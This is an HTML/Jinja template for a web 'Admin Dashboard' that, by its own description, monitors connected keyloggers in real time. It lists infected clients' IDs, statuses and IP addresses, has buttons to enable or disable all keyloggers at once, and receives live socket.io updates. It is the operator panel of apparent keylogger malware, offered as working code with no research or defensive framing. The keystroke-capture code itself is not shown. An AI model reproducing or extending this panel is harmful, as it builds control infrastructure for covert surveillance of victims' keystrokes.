{% extends "base.html" %}

{% block title %}Admin Dashboard{% endblock %}

{% block head %}
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  :root {
    --background: #ffffff;
    --foreground: #020817;
    --muted: #f1f5f9;
    --muted-foreground: #64748b;
    --border: #e2e8f0;
    --primary: #0f172a;
    --primary-foreground: #ffffff;
    --secondary: #f1f5f9;
    --secondary-foreground: #0f172a;
    --destructive: #ef4444;
    --destructive-foreground: #fff;
    --success: #22c55e;
    --success-foreground: #fff;
    --accent: #0ea5e9;
    --accent-foreground: #ffffff;
    --radius: 0.5rem;
  }
  body {
    font-family: system-ui, -apple-system, sans-serif;
    background-color: var(--muted);
    color: var(--foreground);
    line-height: 1.5;
  }
  .hero-section {
    background-color: var(--background);
    padding: 3rem 1rem;
    text-align: center;
    margin-bottom: 2rem;
    border-bottom: 1px solid var(--border);
  }
  .hero-title {
    font-size: 2.5rem;
    font-weight: 600;
    margin-bottom: 1rem;
    color: var(--foreground);
    line-height: 1.2;
  }
  .hero-description {
    color: var(--muted-foreground);
    font-size: 1.125rem;
    margin-bottom: 2rem;
    max-width: 600px;
    margin-left: auto;
    margin-right: auto;
  }
  .btn-group {
    display: flex;
    gap: 0.5rem;
    justify-content: center;
  }
  .btn {
    padding: 0.5rem 1rem;
    border-radius: var(--radius);
    font-weight: 500;
    cursor: pointer;
    border: none;
    transition: all 0.2s;
  }
  .btn:hover {
    opacity: 0.9;
    transform: translateY(-1px);
  }
  .btn:active {
    transform: translateY(0);
  }
  .btn-success {
    background-color: var(--success);
    color: var(--success-foreground);
  }
  .btn-destructive {
    background-color: var(--destructive);
    color: var(--destructive-foreground);
  }
  .container {
    max-width: 1200px;
    margin: 0 auto;
    padding: 0 1rem;
  }
  .table-container {
    background-color: var(--background);
    border-radius: var(--radius);
    border: 1px solid var(--border);
    overflow: hidden;
  }
  table { width: 100%; border-collapse: collapse; }
  th {
    background-color: var(--muted);
    color: var(--muted-foreground);
    font-weight: 500;
    text-align: left;
    padding: 0.75rem 1rem;
    font-size: 0.875rem;
  }
  td {
    padding: 0.75rem 1rem;
    border-top: 1px solid var(--border);
    color: var(--foreground);
  }
  tr:hover { background-color: var(--muted); }
  .status {
    display: inline-flex;
    align-items: center;
    gap: 0.5rem;
  }
  .status::before {
    content: "";
    width: 0.5rem;
    height: 0.5rem;
    border-radius: 50%;
    background-color: var(--muted-foreground);
  }
  .status.enabled::before { background-color: var(--success); }
  .status.disabled::before { background-color: var(--destructive); }
  @media (max-width: 640px) {
    .hero-title { font-size: 2rem; }
    .table-container { overflow-x: auto; }
    .btn-group { flex-direction: column; }
    .btn { width: 100%; }
  }
</style>
{% endblock %}

{% block content %}
<!-- Hero Section -->
<div class="hero-section">
  <h1 class="hero-title">Admin Dashboard</h1>
  <p class="hero-description">
    Monitor connected keyloggers and their statuses in real-time.
  </p>
  <div class="btn-group">
    <button class="btn btn-success" onclick="sendStatus('enabled')">Enable All</button>
    <button class="btn btn-destructive" onclick="sendStatus('disabled')">Disable All</button>
  </div>
</div>

<!-- Main Container for Table -->
<div class="container">
  <div class="table-container">
    <table id="statusTable">
      <thead>
        <tr>
          <th>Client ID</th>
          <th>Status</th>
          <th>IP Address</th>
        </tr>
      </thead>
      <tbody>
        {% for client, info in statuses.items() %}
        <tr>
          <td>{{ client }}</td>
          <td>
            <span class="status {{ info.status }}">{{ info.status }}</span>
          </td>
          <td>{{ info.ip }}</td>
        </tr>
        {% endfor %}
      </tbody>
    </table>
  </div>
</div>

<!-- Scripts -->
<script src="https://cdn.jsdelivr.net/npm/socket.io@4.6.1/dist/socket.io.min.js"></script>
<script>
  function sendStatus(status) {
    fetch('/update_status', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ status: status })
    });
  }

  var socket = io.connect('http://' + document.domain + ':' + location.port);

  socket.on('connect', function() {
    console.log('Connected to server');
  });

  socket.on('status_update', function(statuses) {
    var tbody = document.querySelector('#statusTable tbody');
    tbody.innerHTML = '';
    for (var client_id in statuses) {
      var status = statuses[client_id].status;
      var ip = statuses[client_id].ip || 'N/A';

      var row = document.createElement('tr');
      var clientIdCell = document.createElement('td');
      clientIdCell.textContent = client_id;
      var statusCell = document.createElement('td');
      var statusSpan = document.createElement('span');
      statusSpan.className = `status ${status}`;
      statusSpan.textContent = status;
      statusCell.appendChild(statusSpan);
      var ipCell = document.createElement('td');
      ipCell.textContent = ip;
      row.appendChild(clientIdCell);
      row.appendChild(statusCell);
      row.appendChild(ipCell);
      tbody.appendChild(row);
    }
  });
</script>
{% endblock %}
